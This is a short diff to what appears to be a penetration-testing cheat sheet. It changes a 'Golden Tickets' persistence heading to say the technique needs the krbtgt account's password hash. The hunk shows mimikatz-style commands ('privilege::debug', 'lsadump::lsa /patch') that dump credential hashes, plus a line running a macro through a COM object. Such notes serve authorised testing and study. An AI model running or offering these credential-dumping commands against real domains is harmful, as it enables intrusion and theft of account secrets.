@@ -186,7 +186,7 @@ $com.Run("MyMacro")
 ```
 
 ### Persistence
-###### Golden Tickets
+###### Golden Tickets(only if we can get password hash of a domain user account called krbtgt)
 ```
 privilege::debug
 lsadump::lsa /patch(get password hash)
